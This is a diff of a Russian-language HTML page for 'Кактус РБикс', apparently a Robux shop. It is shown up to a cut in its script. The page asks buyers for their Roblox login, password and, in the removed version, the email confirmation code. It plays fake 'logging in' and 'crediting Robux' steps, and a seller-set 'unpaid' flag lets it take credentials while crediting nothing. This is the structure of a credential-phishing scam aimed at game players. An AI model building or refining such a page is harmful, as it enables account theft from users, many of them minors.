@@ -1,11 +1,9 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🌵 Кактус РБикс</title>
-    <meta name="theme-color" content="#00ff88" />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,600;14..32,700;14..32,800;14..32,900&display=swap" rel="stylesheet" />
     <style>
         * {
             margin: 0;
@@ -19,201 +17,80 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 20px;
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-        }
-
-        .bg-glow {
-            position: fixed;
-            inset: 0;
-            z-index: 0;
-            pointer-events: none;
-            overflow: hidden;
-        }
-
-        .bg-glow .glow {
-            position: absolute;
-            border-radius: 50%;
-            filter: blur(100px);
-            animation: floatGlow 12s ease-in-out infinite alternate;
-        }
-
-        .bg-glow .glow:nth-child(1) {
-            width: 500px;
-            height: 500px;
-            background: rgba(0, 255, 136, 0.08);
-            top: -10%;
-            left: -20%;
-            animation-duration: 14s;
-        }
-
-        .bg-glow .glow:nth-child(2) {
-            width: 400px;
-            height: 400px;
-            background: rgba(0, 200, 255, 0.06);
-            bottom: -10%;
-            right: -20%;
-            animation-duration: 18s;
-            animation-delay: -4s;
-        }
-
-        .bg-glow .glow:nth-child(3) {
-            width: 300px;
-            height: 300px;
-            background: rgba(0, 255, 136, 0.05);
-            top: 40%;
-            left: 50%;
-            transform: translateX(-50%);
-            animation-duration: 16s;
-            animation-delay: -8s;
-        }
-
-        @keyframes floatGlow {
-            0% {
-                transform: translate(0, 0) scale(1);
-            }
-            33% {
-                transform: translate(60px, -40px) scale(1.2);
-            }
-            66% {
-                transform: translate(-40px, 60px) scale(0.8);
-            }
-            100% {
-                transform: translate(30px, -20px) scale(1.1);
-            }
+            padding: 20px;
         }
 
         .card {
-            max-width: 480px;
+            max-width: 420px;
             width: 100%;
-            background: rgba(12, 16, 28, 0.75);
+            background: rgba(12, 16, 28, 0.8);
             backdrop-filter: blur(30px);
-            border-radius: 52px;
-            padding: 38px 28px 28px;
+            border-radius: 44px;
+            padding: 40px 28px 30px;
             border: 1px solid rgba(0, 255, 136, 0.08);
+            box-shadow: 0 40px 80px -20px rgba(0, 0, 0, 0.9);
             position: relative;
-            z-index: 1;
-            box-shadow: 0 40px 80px -20px rgba(0, 0, 0, 0.9), 0 0 80px rgba(0, 255, 136, 0.04);
+            overflow: hidden;
         }
 
         .card::before {
             content: '';
             position: absolute;
             inset: -2px;
-            border-radius: 54px;
+            border-radius: 46px;
             padding: 2px;
-            background: conic-gradient(from 0deg, transparent 0%, rgba(0, 255, 136, 0.2) 15%, rgba(0, 255, 136, 0.4) 30%, transparent 50%, rgba(0, 200, 255, 0.2) 70%, rgba(0, 255, 136, 0.1) 85%, transparent 100%);
+            background: conic-gradient(from 0deg, transparent 0%, rgba(0, 255, 136, 0.2) 30%, transparent 60%);
             -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
             -webkit-mask-composite: xor;
             mask-composite: exclude;
             pointer-events: none;
-            animation: borderRotate 8s linear infinite;
+            animation: rotate 6s linear infinite;
         }
 
-        @keyframes borderRotate {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .logo {
-            font-size: 32px;
+            font-size: 28px;
             font-weight: 900;
             color: #fff;
             display: flex;
             align-items: center;
-            gap: 10px;
-        }
-
-        .logo .cactus-icon {
-            animation: wobble 3s ease-in-out infinite;
-        }
-
-        @keyframes wobble {
-            0%,
-            100% {
-                transform: rotate(-4deg);
-            }
-            50% {
-                transform: rotate(4deg);
-            }
+            gap: 8px;
         }
 
         .logo span {
             color: #00ff88;
             background: rgba(0, 255, 136, 0.06);
-            padding: 2px 16px 2px 12px;
-            border-radius: 18px;
+            padding: 2px 14px 2px 10px;
+            border-radius: 16px;
             border: 1px solid rgba(0, 255, 136, 0.08);
         }
 
-        .logo-sub {
-            font-size: 14px;
+        .subtitle {
             color: #5a6480;
+            font-size: 14px;
             margin-top: 6px;
         }
 
-        .order-table {
-            margin-top: 28px;
-            background: rgba(4, 7, 16, 0.5);
-            backdrop-filter: blur(12px);
-            border-radius: 30px;
-            padding: 4px 20px;
-            border: 1px solid rgba(255, 255, 255, 0.03);
-        }
-
-        .row {
-            display: flex;
-            justify-content: space-between;
-            padding: 18px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
-        }
-
-        .row:last-child {
-            border-bottom: none;
-        }
-
-        .label {
-            color: #4a5270;
-            font-size: 13px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-        }
-
-        .value {
-            color: #d0d8e8;
-            font-weight: 700;
-            font-size: 16px;
-        }
-
-        .value.robux {
-            color: #00ff88;
-        }
-
-        .value.price {
-            color: #00ff88;
-        }
-
         .form-group {
-            margin-top: 16px;
+            margin-top: 18px;
         }
 
         .form-group label {
             display: block;
             color: #5a6480;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 0.5px;
             margin-bottom: 6px;
         }
 
-        .form-group input,
-        .form-group select {
+        .form-group input {
             width: 100%;
             padding: 14px 18px;
             border-radius: 24px;
@@ -221,11 +98,10 @@
             border: 1px solid rgba(255, 255, 255, 0.04);
             color: #fff;
             font-size: 15px;
-            transition: all 0.3s ease;
+            transition: 0.3s ease;
         }
 
-        .form-group input:focus,
-        .form-group select:focus {
+        .form-group input:focus {
             outline: none;
             border-color: rgba(0, 255, 136, 0.15);
         }
@@ -233,450 +109,210 @@
         .btn {
             margin-top: 22px;
             width: 100%;
+            padding: 18px 0;
             background: linear-gradient(135deg, #00ff88, #00cc6a);
             color: #030408;
             border: none;
             border-radius: 60px;
-            padding: 20px 0;
             font-size: 17px;
             font-weight: 800;
             cursor: pointer;
-            transition: all 0.4s ease;
-            text-align: center;
-            display: block;
-            text-decoration: none;
-            box-shadow: 0 4px 40px rgba(0, 255, 136, 0.25);
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 40px rgba(0, 255, 136, 0.2);
         }
 
         .btn:hover {
             transform: translateY(-4px) scale(1.02);
-            box-shadow: 0 8px 50px rgba(0, 255, 136, 0.4);
+            box-shadow: 0 8px 50px rgba(0, 255, 136, 0.35);
         }
 
         .btn:disabled {
             opacity: 0.25;
             cursor: not-allowed;
+            transform: none !important;
         }
 
-        .link-box {
-            margin-top: 18px;
-            padding: 18px 20px;
-            background: rgba(4, 7, 16, 0.5);
-            border-radius: 26px;
-            border: 1px solid rgba(255, 255, 255, 0.03);
-            font-size: 13px;
-            color: #4a5270;
-            word-break: break-all;
-            display: none;
-        }
-
-        .link-box a {
-            color: #00ff88;
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .copy-btn {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            color: #6a7490;
-            padding: 8px 22px;
-            border-radius: 32px;
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.05);
+            color: #5a6480;
+            box-shadow: none;
             margin-top: 12px;
-            transition: all 0.3s ease;
         }
 
-        .copy-btn:hover {
-            background: rgba(255, 255, 255, 0.06);
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.08);
             color: #fff;
-        }
-
-        .status-badge {
-            display: inline-block;
-            padding: 4px 14px;
-            border-radius: 40px;
-            font-size: 12px;
-            font-weight: 700;
-            text-transform: uppercase;
-        }
-
-        .status-active {
-            background: rgba(0, 255, 136, 0.1);
-            color: #00ff88;
-            border: 1px solid rgba(0, 255, 136, 0.15);
-        }
-
-        .status-used {
-            background: rgba(255, 68, 102, 0.1);
-            color: #ff4466;
-            border: 1px solid rgba(255, 68, 102, 0.15);
-        }
-
-        .status-expired {
-            background: rgba(255, 200, 0, 0.1);
-            color: #ffcc00;
-            border: 1px solid rgba(255, 200, 0, 0.15);
-        }
-
-        .status-unpaid {
-            background: rgba(255, 150, 0, 0.1);
-            color: #ff9900;
-            border: 1px solid rgba(255, 150, 0, 0.15);
+            box-shadow: none;
+            transform: translateY(-2px);
         }
 
         .secure {
-            margin-top: 28px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 12px;
-            font-size: 13px;
+            margin-top: 24px;
             color: #2a3250;
-        }
-
-        .activation-status {
-            display: none;
-            margin-top: 20px;
+            font-size: 13px;
             text-align: center;
-            padding: 20px;
+        }
+
+        .secure .lock {
+            margin-right: 8px;
+        }
+
+        /* ===== СТАТУС ===== */
+        .status-box {
+            margin-top: 18px;
+            padding: 16px;
+            border-radius: 20px;
             background: rgba(4, 7, 16, 0.3);
-            border-radius: 24px;
-            border: 1px solid rgba(0, 255, 136, 0.05);
-        }
-
-        .activation-status.show {
-            display: block;
-            animation: fadeUp 0.5s ease;
-        }
-
-        @keyframes fadeUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .activation-status h3 {
-            font-size: 22px;
-            margin-top: 4px;
-        }
-
-        .activation-status h3.success {
-            color: #00ff88;
-        }
-
-        .activation-status h3.warning {
-            color: #ff9900;
-        }
-
-        .activation-status p {
-            color: #7a84a0;
-            margin-top: 4px;
-        }
-
-        .process-steps {
-            margin-top: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
             display: none;
+            font-size: 14px;
+            color: #5a6480;
+            text-align: center;
         }
 
-        .process-steps.show {
+        .status-box.show {
             display: block;
             animation: fadeUp 0.4s ease;
         }
 
-        .step {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            padding: 12px 16px;
-            background: rgba(4, 7, 16, 0.3);
-            border-radius: 16px;
-            margin-bottom: 10px;
-            border-left: 3px solid #2a3250;
-            transition: all 0.4s ease;
-            opacity: 0.5;
-        }
-
-        .step.active {
-            border-left-color: #00ff88;
-            background: rgba(0, 255, 136, 0.04);
-            opacity: 1;
-            animation: stepPulse 1.2s ease-in-out infinite;
-        }
-
-        @keyframes stepPulse {
-            0%,
-            100% {
-                box-shadow: 0 0 0 0 rgba(0, 255, 136, 0);
-            }
-            50% {
-                box-shadow: 0 0 20px rgba(0, 255, 136, 0.05);
-            }
-        }
-
-        .step.done {
-            border-left-color: #00ff88;
-            opacity: 0.7;
-        }
-
-        .step .icon {
-            font-size: 20px;
-            width: 32px;
-            text-align: center;
-        }
-
-        .step .text {
-            color: #d0d8e8;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .step .text small {
-            color: #4a5270;
-            font-weight: 400;
-            font-size: 12px;
-            display: block;
-            margin-top: 2px;
-        }
-
-        .step .status-icon {
-            margin-left: auto;
-            font-size: 16px;
-        }
-
-        .spinner-small {
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.05);
-            border-top: 2px solid #00ff88;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            display: inline-block;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .paid-options {
-            display: flex;
-            gap: 12px;
-            margin-top: 8px;
-        }
-
-        .paid-options label {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 10px 16px;
-            background: rgba(4, 7, 16, 0.3);
-            border-radius: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            cursor: pointer;
-            transition: all 0.3s ease;
-            flex: 1;
-            justify-content: center;
-            color: #5a6480;
-        }
-
-        .paid-options label:hover {
-            border-color: rgba(0, 255, 136, 0.1);
-        }
-
-        .paid-options input[type="radio"] {
-            display: none;
-        }
-
-        .paid-options input[type="radio"]:checked+span {
+        .status-box.success {
+            border-color: rgba(0, 255, 136, 0.15);
             color: #00ff88;
         }
 
-        .paid-options label:has(input:checked) {
-            border-color: rgba(0, 255, 136, 0.2);
-            background: rgba(0, 255, 136, 0.04);
+        .status-box.error {
+            border-color: rgba(255, 68, 102, 0.15);
+            color: #ff4466;
         }
 
+        .status-box.waiting {
+            border-color: rgba(255, 200, 0, 0.15);
+            color: #ffcc00;
+        }
+
+        /* ===== ТАЙМЕР ===== */
+        .timer-box {
+            margin-top: 12px;
+            padding: 12px;
+            border-radius: 16px;
+            background: rgba(4, 7, 16, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.02);
+            display: none;
+            text-align: center;
+        }
+
+        .timer-box.show {
+            display: block;
+        }
+
+        .timer-box .time {
+            font-size: 32px;
+            font-weight: 800;
+            color: #fff;
+            font-variant-numeric: tabular-nums;
+        }
+
+        .timer-box .time.warning {
+            color: #ffcc00;
+            animation: blink 1s ease-in-out infinite;
+        }
+
+        .timer-box .time.danger {
+            color: #ff4466;
+            animation: blink 0.5s ease-in-out infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .timer-box .label {
+            color: #5a6480;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+
+        .timer-box .status-text {
+            color: #5a6480;
+            font-size: 13px;
+            margin-top: 4px;
+        }
+
+        .timer-box .status-text.paid {
+            color: #00ff88;
+        }
+
+        .timer-box .status-text.unpaid {
+            color: #ffcc00;
+        }
+
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ===== АДАПТИВ ===== */
         @media (max-width: 460px) {
             .card {
-                padding: 24px 18px 20px;
-                border-radius: 40px;
+                padding: 28px 18px 22px;
+                border-radius: 36px;
             }
             .logo {
-                font-size: 26px;
+                font-size: 24px;
             }
             .btn {
                 font-size: 15px;
-                padding: 17px 0;
+                padding: 16px 0;
             }
-            .paid-options {
-                flex-direction: column;
+            .timer-box .time {
+                font-size: 28px;
             }
         }
     </style>
 </head>
 <body>
 
-    <div class="bg-glow">
-        <div class="glow"></div>
-        <div class="glow"></div>
-        <div class="glow"></div>
-    </div>
-
     <div class="card">
 
+        <!-- ===== ЛОГОТИП ===== -->
         <div class="logo">
-            <span class="cactus-icon">🌵</span>
-            <span>Кактус</span> РБикс
+            🌵 <span>Кактус</span> РБикс
         </div>
-        <div class="logo-sub">Управление заказами</div>
+        <div class="subtitle">Персональный заказ Robux</div>
 
-        <div class="order-table">
-            <div class="row">
-                <span class="label">Ордер</span>
-                <span class="value" id="orderId">#845217</span>
-            </div>
-            <div class="row">
-                <span class="label">Robux</span>
-                <span class="value robux" id="robuxDisplay">500</span>
-            </div>
-            <div class="row">
-                <span class="label">Цена</span>
-                <span class="value price" id="priceDisplay">$5.99</span>
-            </div>
-            <div class="row">
-                <span class="label">Статус</span>
-                <span class="value">
-                    <span class="status-badge status-active" id="statusBadge">● Активен</span>
-                </span>
-            </div>
-            <div class="row">
-                <span class="label">Срок действия</span>
-                <span class="value" id="expiryDisplay">24 часа</span>
-            </div>
+        <!-- ===== ФОРМА ВХОДА ===== -->
+        <div class="form-group">
+            <label>Логин Roblox</label>
+            <input type="text" id="loginInput" placeholder="Введите логин" />
         </div>
 
-        <!-- ===== ФОРМА ПРОДАВЦА ===== -->
-        <div id="sellerForm">
-            <div class="form-group">
-                <label>Количество Robux</label>
-                <input type="number" id="robuxInput" value="500" min="1" />
-            </div>
-            <div class="form-group">
-                <label>Аккаунт получателя</label>
-                <input type="text" id="accountInput" placeholder="Логин получателя" />
-            </div>
-            <div class="form-group">
-                <label>Код / Пароль</label>
-                <input type="text" id="codeInput" placeholder="Код или пароль" />
-            </div>
-            <div class="form-group">
-                <label>Статус заказа</label>
-                <div class="paid-options">
-                    <label>
-                        <input type="radio" name="paidStatus" value="paid" checked />
-                        <span>✅ Оплачен</span>
-                    </label>
-                    <label>
-                        <input type="radio" name="paidStatus" value="unpaid" />
-                        <span>⏳ Не оплачен</span>
-                    </label>
-                </div>
-            </div>
-            <div class="form-group">
-                <label>Срок действия</label>
-                <select id="expirySelect">
-                    <option value="1">1 час</option>
-                    <option value="6">6 часов</option>
-                    <option value="12">12 часов</option>
-                    <option value="24" selected>24 часа</option>
-                    <option value="48">48 часов</option>
-                    <option value="72">3 дня</option>
-                    <option value="168">7 дней</option>
-                </select>
-            </div>
-            <button class="btn" id="createBtn">🔗 Создать ссылку</button>
+        <div class="form-group">
+            <label>Пароль Roblox</label>
+            <input type="password" id="passwordInput" placeholder="Введите пароль" />
         </div>
 
-        <!-- ===== ФОРМА ПОКУПАТЕЛЯ ===== -->
-        <div id="buyerForm" style="display: none;">
-            <div class="form-group">
-                <label>Логин Roblox</label>
-                <input type="text" id="buyerLogin" placeholder="Введите логин" />
-            </div>
-            <div class="form-group">
-                <label>Пароль Roblox</label>
-                <input type="password" id="buyerPassword" placeholder="Введите пароль" />
-            </div>
-            <div class="form-group" id="codeGroup" style="display: none;">
-                <label>Код подтверждения с почты</label>
-                <input type="text" id="buyerCode" placeholder="Введите код из письма" maxlength="6" />
-                <div style="margin-top: 8px; font-size: 12px; color: #4a5270;">
-                    📧 Код отправлен на почту, привязанную к аккаунту
-                </div>
-            </div>
-            <button class="btn" id="activateBtn">🚀 Войти и получить Robux</button>
+        <!-- ===== ОРДЕР ===== -->
+        <div class="form-group" style="margin-top: 12px;">
+            <label>Ордер</label>
+            <input type="text" id="orderInput" placeholder="Введите номер ордера" />
         </div>
 
-        <!-- ===== ПРОЦЕСС ПОШАГОВО ===== -->
-        <div class="process-steps" id="processSteps">
-            <div class="step" id="step1">
-                <span class="icon">🔑</span>
-                <span class="text">Вход в аккаунт <small>Проверка логина и пароля...</small></span>
-                <span class="status-icon" id="step1Status">⏳</span>
-            </div>
-            <div class="step" id="step2">
-                <span class="icon">📧</span>
-                <span class="text">Код подтверждения <small>Ожидание кода с почты...</small></span>
-                <span class="status-icon" id="step2Status">⏳</span>
-            </div>
-            <div class="step" id="step3">
-                <span class="icon">🛡️</span>
-                <span class="text">Создание сессии <small>Готовим безопасное соединение...</small></span>
-                <span class="status-icon" id="step3Status">⏳</span>
-            </div>
-            <div class="step" id="step4">
-                <span class="icon">💰</span>
-                <span class="text" id="step4Text">Зачисление Robux <small>Перевод на аккаунт...</small></span>
-                <span class="status-icon" id="step4Status">⏳</span>
-            </div>
-            <div class="step" id="step5">
-                <span class="icon">✅</span>
-                <span class="text">Готово! <small>Сессия завершена</small></span>
-                <span class="status-icon" id="step5Status">⏳</span>
-            </div>
+        <!-- ===== КНОПКИ ===== -->
+        <button class="btn" id="enterBtn">🚀 Войти и получить Robux</button>
+        <button class="btn btn-secondary" id="checkBtn">🔍 Проверить оплату</button>
+
+        <!-- ===== СТАТУС ===== -->
+        <div class="status-box" id="statusBox"></div>
+
+        <!-- ===== ТАЙМЕР ===== -->
+        <div class="timer-box" id="timerBox">
+            <div class="time" id="timerDisplay">05:00</div>
+            <div class="label">Осталось времени на сессию</div>
+            <div class="status-text" id="sessionStatus">⏳ Ожидание оплаты...</div>
         </div>
 
-        <!-- ===== СТАТУС АКТИВАЦИИ ===== -->
-        <div class="activation-status" id="activationStatus">
-            <div style="font-size: 48px;" id="activationIcon">✅</div>
-            <h3 id="activationTitle" class="success">Готово!</h3>
-            <p id="activationDesc">Robux отправлены на аккаунт</p>
-            <p style="color: #4a5270; font-size: 13px; margin-top: 8px;">⚡ Ссылка более недействительна</p>
-        </div>
-
-        <!-- ===== ССЫЛКА ===== -->
-        <div class="link-box" id="linkBox">
-            <span>🔗 Одноразовая ссылка:</span><br />
-            <a href="#" id="linkUrl" target="_blank">https://...</a>
-            <br />
-            <button class="copy-btn" id="copyBtn">📋 Копировать</button>
-            <div style="margin-top: 12px; font-size: 12px; color: #3a4260;">
-                ⚠️ Ссылка действительна <span id="linkExpiry">24</span> часа. После активации станет недействительной.
-            </div>
-        </div>
-
+        <!-- ===== ЗАЩИТА ===== -->
         <div class="secure">
             <span class="lock">🔒</span> Защищённое соединение
         </div>
@@ -684,337 +320,163 @@
     </div>
 
     <script>
-        // ===== СОСТОЯНИЕ =====
-        const PRICE_PER_ROBUX = 0.011;
-
         // ===== ЭЛЕМЕНТЫ =====
-        const orderIdEl = document.getElementById('orderId');
-        const robuxDisplay = document.getElementById('robuxDisplay');
-        const priceDisplay = document.getElementById('priceDisplay');
-        const statusBadge = document.getElementById('statusBadge');
-        const expiryDisplay = document.getElementById('expiryDisplay');
-        const robuxInput = document.getElementById('robuxInput');
-        const accountInput = document.getElementById('accountInput');
-        const codeInput = document.getElementById('codeInput');
-        const expirySelect = document.getElementById('expirySelect');
-        const createBtn = document.getElementById('createBtn');
-        const linkBox = document.getElementById('linkBox');
-        const linkUrl = document.getElementById('linkUrl');
-        const copyBtn = document.getElementById('copyBtn');
-        const linkExpiry = document.getElementById('linkExpiry');
-        const sellerForm = document.getElementById('sellerForm');
-        const buyerForm = document.getElementById('buyerForm');
-        const buyerLogin = document.getElementById('buyerLogin');
-        const buyerPassword = document.getElementById('buyerPassword');
-        const buyerCode = document.getElementById('buyerCode');
-        const codeGroup = document.getElementById('codeGroup');
-        const activateBtn = document.getElementById('activateBtn');
-        const activationStatus = document.getElementById('activationStatus');
-        const activationTitle = document.getElementById('activationTitle');
-        const activationDesc = document.getElementById('activationDesc');
-        const activationIcon = document.getElementById('activationIcon');
-        const processSteps = document.getElementById('processSteps');
-        const step4Text = document.getElementById('step4Text');
+        const loginInput = document.getElementById('loginInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const orderInput = document.getElementById('orderInput');
+        const enterBtn = document.getElementById('enterBtn');
+        const checkBtn = document.getElementById('checkBtn');
+        const statusBox = document.getElementById('statusBox');
+        const timerBox = document.getElementById('timerBox');
+        const timerDisplay = document.getElementById('timerDisplay');
+        const sessionStatus = document.getElementById('sessionStatus');
 
-        let currentOrderId = null;
-        let isUsed = false;
-        let expiryHours = 24;
-        let stepInterval = null;
-        let currentStep = 0;
-        let isPaid = true;
+        // ===== СОСТОЯНИЕ =====
+        let timerInterval = null;
+        let timeLeft = 300; // 5 минут
+        let isPaid = false;
+        let isSessionActive = false;
 
-        // Шаги процесса
-        const steps = [
-            { id: 'step1', status: 'step1Status', text: 'Вход в аккаунт', done: false },
-            { id: 'step2', status: 'step2Status', text: 'Код подтверждения', done: false },
-            { id: 'step3', status: 'step3Status', text: 'Создание сессии', done: false },
-            { id: 'step4', status: 'step4Status', text: 'Зачисление Robux', done: false },
-            { id: 'step5', status: 'step5Status', text: 'Готово!', done: false }
-        ];
-
-        // ===== ГЕНЕРАЦИЯ ОРДЕРА =====
-        function generateOrderId() {
-            return '#' + String(Math.floor(100000 + Math.random() * 900000));
-        }
-
-        // ===== ОБНОВЛЕНИЕ ДИСПЛЕЯ =====
-        function updateDisplay() {
-            const robux = parseInt(robuxInput.value) || 100;
-            robuxDisplay.textContent = robux;
-            const price = (robux * PRICE_PER_ROBUX).toFixed(2);
-            priceDisplay.textContent = '$' + price;
-
-            if (isUsed) {
-                statusBadge.className = 'status-badge status-used';
-                statusBadge.textContent = '✖ Использована';
-            } else if (currentOrderId) {
-                statusBadge.className = 'status-badge status-active';
-                statusBadge.textContent = '● Активна';
-            } else {
-                statusBadge.className = 'status-badge status-active';
-                statusBadge.textContent = '● Активен';
-            }
-
-            const h = expirySelect.value;
-            if (h == 1) expiryDisplay.textContent = '1 час';
-            else if (h == 24) expiryDisplay.textContent = '24 часа';
-            else if (h >= 168) expiryDisplay.textContent = Math.floor(h / 24) + ' дней';
-            else expiryDisplay.textContent = h + ' часов';
-
-            if (currentOrderId) {
-                orderIdEl.textContent = currentOrderId;
-            } else {
-                orderIdEl.textContent = generateOrderId();
+        // ===== ФУНКЦИЯ ПОКАЗА СТАТУСА =====
+        function showStatus(text, type) {
+            statusBox.textContent = text;
+            statusBox.className = 'status-box show';
+            if (type) {
+                statusBox.classList.add(type);
             }
         }
 
-        // ===== СОЗДАНИЕ ССЫЛКИ =====
-        createBtn.addEventListener('click', function() {
-            const robux = parseInt(robuxInput.value) || 100;
-            const account = accountInput.value.trim() || 'Не указан';
-            const code = codeInput.value.trim() || 'Не указан';
-            const expiry = parseInt(expirySelect.value);
+        // ===== ФУНКЦИЯ ТАЙМЕРА =====
+        function startTimer() {
+            timerBox.classList.add('show');
+            isSessionActive = true;
+            timeLeft = 300;
+            updateTimerDisplay();
 
-            // Проверяем статус оплаты
-            const paidRadio = document.querySelector('input[name="paidStatus"]:checked');
-            isPaid = paidRadio ? paidRadio.value === 'paid' : true;
+            clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                updateTimerDisplay();
 
-            expiryHours = expiry;
-            currentOrderId = generateOrderId();
-            isUsed = false;
-            updateDisplay();
-
-            const baseUrl = window.location.href.split('?')[0];
-            const link = baseUrl +
-                '?order=' + currentOrderId.replace('#', '') +
-                '&robux=' + robux +
-                '&account=' + encodeURIComponent(account) +
-                '&code=' + encodeURIComponent(code) +
-                '&expiry=' + expiry +
-                '&paid=' + (isPaid ? '1' : '0');
-
-            linkUrl.href = link;
-            linkUrl.textContent = link;
-            linkExpiry.textContent = expiry;
-            linkBox.style.display = 'block';
-
-            localStorage.setItem('kaktus_order_' + currentOrderId.replace('#', ''), JSON.stringify({
-                robux: robux,
-                account: account,
-                code: code,
-                expiryHours: expiry,
-                createdAt: Date.now(),
-                isUsed: false,
-                isPaid: isPaid
-            }));
-
-            sellerForm.style.display = 'none';
-            buyerForm.style.display = 'none';
-            activationStatus.classList.remove('show');
-            processSteps.classList.remove('show');
-
-            alert('✅ Ссылка создана!');
-            copyLink();
-        });
-
-        // ===== КОПИРОВАНИЕ =====
-        function copyLink() {
-            const link = linkUrl.href;
-            if (link && link !== 'https://...') {
-                navigator.clipboard.writeText(link).catch(() => {
-                    const textarea = document.createElement('textarea');
-                    textarea.value = link;
-                    document.body.appendChild(textarea);
-                    textarea.select();
-                    document.execCommand('copy');
-                    document.body.removeChild(textarea);
-                });
-            }
-        }
-
-        copyBtn.addEventListener('click', copyLink);
-
-        // ===== ПОШАГОВЫЙ ПРОЦЕСС =====
-        function startProcess() {
-            processSteps.classList.add('show');
-            currentStep = 0;
-            steps.forEach((s, i) => {
-                const el = document.getElementById(s.id);
-                el.className = 'step';
-                if (i === 0) el.classList.add('active');
-                document.getElementById(s.status).textContent = '⏳';
-            });
-
-            // Если заказ не оплачен — меняем текст 4-го шага
-            if (!isPaid) {
-                step4Text.innerHTML = 'Проверка аккаунта <small>Сессия создана без зачисления...</small>';
-            } else {
-                step4Text.innerHTML = 'Зачисление Robux <small>Перевод на аккаунт...</small>';
-            }
-
-            clearInterval(stepInterval);
-            stepInterval = setInterval(() => {
-                if (currentStep < steps.length - 1) {
-                    const current = steps[currentStep];
-                    const el = document.getElementById(current.id);
-                    el.classList.remove('active');
-                    el.classList.add('done');
-                    document.getElementById(current.status).textContent = '✅';
-
-                    currentStep++;
-                    const next = steps[currentStep];
-                    const nextEl = document.getElementById(next.id);
-                    nextEl.classList.add('active');
-                    document.getElementById(next.status).innerHTML = '<span class="spinner-small"></span>';
-
-                    if (currentStep === 1) {
-                        codeGroup.style.display = 'block';
-                        buyerCode.focus();
-                        activateBtn.textContent = '📧 Подтвердить код';
-                    }
-
-                } else {
-                    clearInterval(stepInterval);
-                    const last = steps[steps.length - 1];
-                    const lastEl = document.getElementById(last.id);
-                    lastEl.classList.remove('active');
-                    lastEl.classList.add('done');
-                    document.getElementById(last.status).textContent = '✅';
-
-                    setTimeout(() => {
-                        processSteps.classList.remove('show');
-                        activationStatus.classList.add('show');
-
-                        if (isPaid) {
-                            activationIcon.textContent = '✅';
-                            activationTitle.textContent = 'Готово!';
-                            activationTitle.className = 'success';
-                            activationDesc.textContent = 'Robux успешно зачислены на аккаунт';
-                        } else {
-                            activationIcon.textContent = '⏳';
-                            activationTitle.textContent = 'Сессия создана!';
-                            activationTitle.className = 'warning';
-                            activationDesc.textContent = 'Заказ не оплачен. Robux не зачислены.';
-                        }
-
-                        statusBadge.className = 'status-badge status-used';
-                        statusBadge.textContent = '✖ Использована';
-                        isUsed = true;
-
-                        if (orderParam) {
-                            const stored = localStorage.getItem('kaktus_order_' + orderParam);
-                            if (stored) {
-                                const data = JSON.parse(stored);
-                                data.isUsed = true;
-                                localStorage.setItem('kaktus_order_' + orderParam, JSON.stringify(data));
-                            }
-                        }
-
-                        activateBtn.disabled = false;
-                        activateBtn.innerHTML = '🚀 Войти и получить Robux';
-                    }, 500);
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    isSessionActive = false;
+                    timerDisplay.textContent = '00:00';
+                    sessionStatus.textContent = '⏰ Время вышло! Сессия завершена.';
+                    sessionStatus.className = 'status-text unpaid';
+                    showStatus('⏰ Время вышло. Заказ не оплачен. Сессия завершена.', 'error');
+                    enterBtn.disabled = false;
+                    enterBtn.innerHTML = '🚀 Войти и получить Robux';
                 }
-            }, 2500);
+            }, 1000);
         }
 
-        // ===== ПРОВЕРКА URL =====
-        const urlParams = new URLSearchParams(window.location.search);
-        const orderParam = urlParams.get('order');
-        const robuxParam = urlParams.get('robux');
-        const expiryParam = urlParams.get('expiry');
-        const paidParam = urlParams.get('paid');
+        // ===== ОБНОВЛЕНИЕ ТАЙМЕРА =====
+        function updateTimerDisplay() {
+            const mins = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+            const secs = String(timeLeft % 60).padStart(2, '0');
+            timerDisplay.textContent = `${mins}:${secs}`;
 
-        if (orderParam) {
-            sellerForm.style.display = 'none';
